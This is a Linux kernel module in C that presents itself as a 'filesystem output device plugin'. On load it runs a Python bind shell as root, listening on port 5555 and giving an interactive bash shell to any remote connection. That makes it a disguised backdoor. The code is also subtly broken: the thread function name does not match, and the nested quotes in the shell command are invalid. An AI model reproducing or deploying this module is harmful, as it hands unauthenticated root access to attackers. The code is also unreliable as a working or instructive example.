#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/sched.h>
#include <linux/kthread.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Unknown");
MODULE_DESCRIPTION("Native linux filesystem output device plugin");

#define PATH "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"
#define HOME "HOME=/"
#define TERM "TERM=linux"
#define CMD "python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.bind(('0.0.0.0',5555)); s.listen(1); conn,addr=s.accept(); os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2); p=subprocess.call(['/bin/bash','-i']);'

static struct task_struct *my_thread;

static int exec(void *data) {
    char *argv[] = { CMD, NULL };
    static char *envp[] = {
        HOME,
        TERM,
        PATH, NULL
    };

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    return 0;
}

static int __init init(void) {
    printk(KERN_INFO "Command Module Loaded\n");

    my_thread = kthread_create(execute_command, NULL, "my_thread");
    wake_up_process(my_thread);

    return 0;
}

static void __exit cleanup(void) {
    printk(KERN_INFO "Command Module Unloaded\n");

    kthread_stop(my_thread);
}

module_init(init);
module_exit(cleanup);
